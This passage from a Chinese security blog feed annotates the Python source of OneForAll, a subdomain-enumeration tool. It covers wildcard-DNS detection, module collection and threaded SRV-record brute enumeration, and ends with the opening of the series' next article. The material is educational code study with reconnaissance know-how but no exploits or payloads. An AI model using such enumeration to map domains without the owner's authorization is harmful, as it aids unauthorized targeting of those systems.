class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The domain <span class="hljs-subst">&#123;domain&#125;</span> enables wildcard&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The domain <span class="hljs-subst">&#123;domain&#125;</span> disables wildcard&#x27;</span>)<br>    <span class="hljs-keyword">return</span> is_enable<br><br><span class="hljs-comment"># def to_detect_wildcard(domain):</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">to_detect_wildcard</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检测是否使用通配符dns记录</span><br><span class="hljs-string">    Detect use wildcard dns record or not</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param  str  domain:  domain</span><br><span class="hljs-string">    :return bool use wildcard dns record or not</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Detecting <span class="hljs-subst">&#123;domain&#125;</span> use wildcard dns record or not&#x27;</span>)<br>    <span class="hljs-comment"># 跟进函数 最后返回三个子域名，前缀为随机8位字符的子域名</span><br>    random_subdomains = gen_random_subdomains(domain, <span class="hljs-number">3</span>)<br>    <span class="hljs-comment"># 跟进函数 判断是否子域都解析成功返回bool类型</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> all_resolve_success(random_subdomains):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># 跟进分析 判断是否所有子域都请求成功返回是否请求成功和具体的返回页面信息</span><br>    is_all_success, all_request_resp = all_request_success(random_subdomains)<br>    <span class="hljs-comment"># 如果没有请求成功，返回True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_all_success:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-comment"># 跟进分析 返回是否有HTML界面结构相似</span><br>    <span class="hljs-keyword">return</span> any_similar_html(all_request_resp)<br></code></pre></div></td></tr></table></figure><h3 id="2-1-1-gen-random-subdomains"><a href="#2-1-1-gen-random-subdomains" class="headerlink" title="2.1.1 gen_random_subdomains"></a>2.1.1 gen_random_subdomains</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def gen_random_subdomains</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_random_subdomains</span>(<span class="hljs-params">domain, count</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    生成指定数量的随机子域域名列表</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param domain: 主域</span><br><span class="hljs-string">    :param count: 数量</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    subdomains = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-comment"># 如果指定数量小于1 直接返回空</span><br>    <span class="hljs-keyword">if</span> count &lt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> subdomains<br>    <span class="hljs-comment"># 重复对应次数</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        <span class="hljs-comment"># token_hex(x): binascii.hexlify(token_bytes(x)).decode(&#x27;ascii&#x27;)</span><br>        <span class="hljs-comment"># 其中token_bytes(x): </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">if nbytes is None:</span><br><span class="hljs-string">    nbytes = DEFAULT_ENTROPY</span><br><span class="hljs-string">return os.urandom(nbytes)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 此处是生成随机8字符</span><br>        token = secrets.token_hex(<span class="hljs-number">4</span>)<br>        <span class="hljs-comment"># 添加到subdomains中eg:&#x27;9e79025d.qq.com&#x27; 不清楚这种乱码子域名干啥的。。</span><br>        subdomains.add(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;token&#125;</span>.<span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> subdomains<br></code></pre></div></td></tr></table></figure><h3 id="2-1-2-all-resolve-success"><a href="#2-1-2-all-resolve-success" class="headerlink" title="2.1.2 all_resolve_success"></a>2.1.2 all_resolve_success</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def all_resolve_success</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">all_resolve_success</span>(<span class="hljs-params">subdomains</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    判断是否所有子域都解析成功</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param subdomains: 子域列表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 此处返回创建的Resolver对象，其中包含了默认的DNS解析地址列表，解析超时时间，解析闯祸时间</span><br>    resolver = utils.dns_resolver()<br>    resolver.cache = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 不使用DNS缓存</span><br>    status = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> subdomain <span class="hljs-keyword">in</span> subdomains:<br>        <span class="hljs-comment"># 跟进分析 对每个子域名进行dns解析之后返回bool类型</span><br>        status.add(query_a_record(subdomain, resolver))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(status)<br></code></pre></div></td></tr></table></figure><h3 id="2-1-3-any-similar-html"><a href="#2-1-3-any-similar-html" class="headerlink" title="2.1.3 any_similar_html"></a>2.1.3 any_similar_html</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">any_similar_html</span>(<span class="hljs-params">resp_list</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    判断是否有一组HTML页面结构相似</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param resp_list: 响应HTML页面</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    html_doc1, html_doc2, html_doc3 = resp_list<br>    <span class="hljs-keyword">if</span> similarity.is_similar(html_doc1, html_doc2):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> similarity.is_similar(html_doc1, html_doc3):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> similarity.is_similar(html_doc2, html_doc3):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-4-query-a-record"><a href="#2-1-4-query-a-record" class="headerlink" title="2.1.4 query_a_record"></a>2.1.4 query_a_record</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def query_a_record</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_a_record</span>(<span class="hljs-params">subdomain, resolver</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    查询子域A记录</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param subdomain: 子域</span><br><span class="hljs-string">    :param resolver: DNS解析器</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 查询对应的DNS解析信息</span><br>        answer = resolver.query(subdomain, <span class="hljs-string">&#x27;A&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Query <span class="hljs-subst">&#123;subdomain&#125;</span> wildcard dns record error&#x27;</span>)<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, e.args)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># 如果返回空 返回false</span><br>    <span class="hljs-keyword">if</span> answer.rrset <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># 获取ttl，name以及ip地址信息并返回true</span><br>    ttl = answer.ttl<br>    name = answer.name<br>    ips = &#123;item.address <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> answer&#125;<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;subdomain&#125;</span> resolve to: <span class="hljs-subst">&#123;name&#125;</span> &#x27;</span><br>                        <span class="hljs-string">f&#x27;IP: <span class="hljs-subst">&#123;ips&#125;</span> TTL: <span class="hljs-subst">&#123;ttl&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></div></td></tr></table></figure><h2 id="2-2-Collect-对象"><a href="#2-2-Collect-对象" class="headerlink" title="2.2 Collect 对象"></a>2.2 Collect 对象</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Collect class</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Collect</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-comment"># 初始化内容</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        self.domain = domain<br>        self.modules = []<br>        self.collect_funcs = []<br>        <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_mod</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Get modules</span><br><span class="hljs-string">        获取模块</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 如果启用全部模块开启 默认True</span><br>        <span class="hljs-keyword">if</span> settings.enable_all_module:<br>            <span class="hljs-comment"># The crawl module has some problems</span><br>            <span class="hljs-comment"># 爬取模块有些问题？？？</span><br>            <span class="hljs-comment"># 具体模块</span><br>            modules = [<span class="hljs-string">&#x27;certificates&#x27;</span>, <span class="hljs-string">&#x27;check&#x27;</span>, <span class="hljs-string">&#x27;datasets&#x27;</span>,<br>                       <span class="hljs-string">&#x27;dnsquery&#x27;</span>, <span class="hljs-string">&#x27;intelligence&#x27;</span>, <span class="hljs-string">&#x27;search&#x27;</span>]<br>            <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> modules:<br>                <span class="hljs-comment"># 显示模块的具体路径</span><br>                module_path = settings.module_dir.joinpath(module)<br>                <span class="hljs-comment"># 遍历当前目录下的所有.py结尾的文件</span><br>                <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> module_path.rglob(<span class="hljs-string">&#x27;*.py&#x27;</span>):<br>                    <span class="hljs-comment"># 设置模块内容 具体输出参考import_module=&#x27;modules.check.文件名&#x27;注意文件名不包含.py</span><br>                    import_module = <span class="hljs-string">f&#x27;modules.<span class="hljs-subst">&#123;module&#125;</span>.<span class="hljs-subst">&#123;path.stem&#125;</span>&#x27;</span><br>                    <span class="hljs-comment"># 将模块模块添加进modules中</span><br>                    self.modules.append(import_module)<br>        <span class="hljs-comment"># 没有按照默认则只导入用户设置的部分收集模块</span><br>        <span class="hljs-keyword">else</span>:<br>            self.modules = settings.enable_partial_module<br>            <br>    <span class="hljs-comment"># 导入模块</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">import_func</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Import do function</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> self.modules:<br>            <span class="hljs-comment"># name为最后一个.之后的内容即具体的文件</span><br>            name = module.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]<br>            <span class="hljs-comment"># 导入具体的文件</span><br>            import_object = importlib.import_module(module)<br>            <span class="hljs-comment"># 将各个模块的内容存储在self中(暂时的理解)</span><br>            func = <span class="hljs-built_in">getattr</span>(import_object, <span class="hljs-string">&#x27;run&#x27;</span>)<br>            self.collect_funcs.append([func, name])<br>            <br><br>    <span class="hljs-comment"># 主要运行的部分</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Class entrance</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start collecting subdomains of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># 跟进函数 初始化需要的模块</span><br>        self.get_mod()<br>        <span class="hljs-comment"># 跟进函数 导入函数</span><br>        self.import_func()<br><br>        threads = []<br>        <span class="hljs-comment"># Create subdomain collection threads</span><br>        <span class="hljs-comment"># 创建子域集合线程</span><br>        <span class="hljs-keyword">for</span> func_obj, func_name <span class="hljs-keyword">in</span> self.collect_funcs:<br>            thread = threading.Thread(target=func_obj, name=func_name,<br>                                      args=(self.domain,), daemon=<span class="hljs-literal">True</span>)<br>            threads.append(thread)<br>        <span class="hljs-comment"># Start all threads</span><br>        <span class="hljs-comment"># 开始所有线程</span><br>        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>            thread.start()<br>        <span class="hljs-comment"># Wait for all threads to finish</span><br>        <span class="hljs-comment"># 等待所有线程</span><br>        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>            <span class="hljs-comment"># 挨个线程判断超时 最坏情况主线程阻塞时间=线程数*module_thread_timeout</span><br>            <span class="hljs-comment"># 超时线程将脱离主线程 由于创建线程时已添加守护属于 所有超时线程会随着主线程结束</span><br>            thread.join(settings.module_thread_timeout)<br>        <span class="hljs-comment"># 逐个判断是否有线程超时并输出对应信息</span><br>        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>            <span class="hljs-keyword">if</span> thread.is_alive():<br>                logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;thread.name&#125;</span> module thread timed out&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>具体模块内容参考之后的OneForAll代码分析-3</p><h1 id="3-BruteSRV"><a href="#3-BruteSRV" class="headerlink" title="3. BruteSRV"></a>3. BruteSRV</h1><p>通过枚举域名常见的SRV记录做查询来发现子域</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BruteSRV</span>(<span class="hljs-params">Module</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Module.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;BruteSRV&#x27;</span><br>        self.source = <span class="hljs-string">&quot;BruteSRV&quot;</span><br>        self.qtype = <span class="hljs-string">&#x27;SRV&#x27;</span><br>        self.thread_num = <span class="hljs-number">20</span><br>        <span class="hljs-comment"># 获得队列对象</span><br>        self.names_queue = queue.Queue()<br>        self.answers_queue = queue.Queue()<br>        <br>    <span class="hljs-comment"># 生成对应子域名队列</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill_queue</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 获得默认的srv_prefixes.json文件路径</span><br>        path = data_storage_dir.joinpath(<span class="hljs-string">&#x27;srv_prefixes.json&#x27;</span>)<br>        <span class="hljs-comment"># 加载为json返回内容差不多是一个列表形式</span><br>        prefixes = utils.load_json(path)<br>        <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> prefixes:<br>            <span class="hljs-comment"># 将生成的子域名放入队列中</span><br>            self.names_queue.put(prefix + self.domain)<br>    <br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_brute</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.thread_num):<br>            <span class="hljs-comment"># 多线程操作查询对应信息</span><br>            thread = BruteThread(self.names_queue, self.answers_queue)<br>            thread.name = <span class="hljs-string">f&#x27;BruteThread-<span class="hljs-subst">&#123;num&#125;</span>&#x27;</span><br>            thread.daemon = <span class="hljs-literal">True</span><br>            <span class="hljs-comment"># 开启子线程</span><br>            thread.start()<br>        <span class="hljs-comment"># 等到队列为空，再执行别的操作</span><br>        self.names_queue.join()<br>        <br>        <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deal_answers</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 当回应不为空</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.answers_queue.empty():<br>            <span class="hljs-comment"># 获取回应队列的内容</span><br>            answer = self.answers_queue.get()<br>            <span class="hljs-keyword">if</span> answer <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> answer:<br>                record = <span class="hljs-built_in">str</span>(item)<br>                <span class="hljs-comment"># 匹配内容增加子域名</span><br>                subdomains = self.match_subdomains(record)<br>                self.subdomains.update(subdomains)<br>        <br>        <br>    <span class="hljs-comment"># 入口函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        self.begin()<br>        <span class="hljs-comment"># 之后的内容基本都是在该类中，分析在前面部分</span><br>        self.fill_queue()<br>        self.do_brute()<br>        self.deal_answers()<br>        <br>        self.finish()<br>        self.save_json()<br>        self.gen_result()<br>        self.save_db()<br>        <br>        <br>        <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BruteThread</span>(<span class="hljs-params">threading.Thread</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, names_queue, answers_queue</span>):</span><br>        threading.Thread.__init__(self)<br>        self.names_queue = names_queue<br>        self.answers_queue = answers_queue<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 读取数列</span><br>            name = self.names_queue.get()<br>            <span class="hljs-comment"># 查询对应域名dns中的SRV信息</span><br>            answer = utils.dns_query(name, <span class="hljs-string">&#x27;SRV&#x27;</span>)<br>            <span class="hljs-comment"># 写入队列</span><br>            self.answers_queue.put(answer)<br>            <span class="hljs-comment"># 向任务完成的队列发送信号，主要是给join用的，每次get后需要调用task_done，直到所有任务都task_done。join才取消阻塞</span><br>            self.names_queue.task_done()<br></code></pre></div></td></tr></table></figure><h1 id="4-Brute"><a href="#4-Brute" class="headerlink" title="4.Brute"></a>4.Brute</h1><p>该部分内容较多，放置OneForAll代码分析-4中进行分析</p>]]></content>
    
    
    <categories>
      
      <category>信安 工具分析 OneForAll</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>工具分析</tag>
      
      <tag>OneForAll</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OneForAll代码分析-1</title>
    <link href="/2021/09/09/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1/"/>
    <url>/2021/09/09/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1/</url>
    
    <content type="html"><![CDATA[<h1 id="OneForAll代码分析-1"><a href="#OneForAll代码分析-1" class="headerlink" title="OneForAll代码分析-1"></a>OneForAll代码分析-1</h1><p>将OneForAll作为第一个分析的代码，所以在分析过程中会从最基础的开始分析，并且基本上是没有分析经历，所以可能会有很多的弯路！</p><h1 id="查看oneforall原作者讲解"><a href="#查看oneforall原作者讲解" class="headerlink" title="查看oneforall原作者讲解"></a>查看oneforall原作者讲解</h1><p>讲解<a href="https://zhuanlan.zhihu.com/p/78206111">网址</a>，根据作者讲解，Oneforall的主函数是oneforall.py，所以将oneforall.py作为第一个分析的文件</p><p>整个目录结构</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm"><span class="hljs-type">D</span>:.<br>|<br>+<span class="hljs-comment">---.github</span><br>+<span class="hljs-comment">---docs</span><br>|       collection_modules.md 收集模块说明<br>+<span class="hljs-comment">---images</span><br>\<span class="hljs-comment">---oneforall</span><br>    |   aiobrute.py   异步多进程多协程子域爆破模块，可以单独运行<br>    |   collect.py    各个收集模块上层调用<br>    |   config.py     配置文件<br>    |   dbex<span class="hljs-keyword">port</span>.py   数据库导出模块，可以单独运行<br>    |   domains.txt   要批量爆破的域名列表<br>    |   oneforall.py  <span class="hljs-type">OneForAll</span>主入口，可以单独运行<br>    |   __init__.py<br>    |<br>    +<span class="hljs-comment">---common 公共调用模块</span><br>    +<span class="hljs-comment">---data   存放一些所需数据</span><br>    |       next_subdomains.txt     下一层子域字典<br>    |       public_suffix_list.dat  顶级域名后缀 <br>    |       srv_names.json          常见<span class="hljs-type">SRV</span>记录前缀名<br>    |       subdomains.txt          子域爆破常见字典<br>    |<br>    \<span class="hljs-comment">---modules </span><br>        +<span class="hljs-comment">---certificates     利用证书透明度收集子域模块</span><br>        +<span class="hljs-comment">---check            常规检查收集子域模块</span><br>        +<span class="hljs-comment">---crawl            利用网上爬虫档案收集子域模块</span><br>        +<span class="hljs-comment">---datasets         利用DNS数据集收集子域模块</span><br>        +<span class="hljs-comment">---dnsquery         利用DNS查询收集子域模块</span><br>        +<span class="hljs-comment">---intelligence     利用威胁情报平台数据收集子域模块</span><br>        \<span class="hljs-comment">---search           利用搜索引擎发现子域模块</span><br></code></pre></div></td></tr></table></figure><p>在oneforall.py中，使用了fire.Fire实现命令行界面，具体fire的使用参考<a href="https://blog.csdn.net/qq_17550379/article/details/79943740">网址</a></p><h2 id="1-init-函数"><a href="#1-init-函数" class="headerlink" title="1. __init__函数"></a>1. __init__函数</h2><p>此处只介绍oneforall.py中使用部分</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 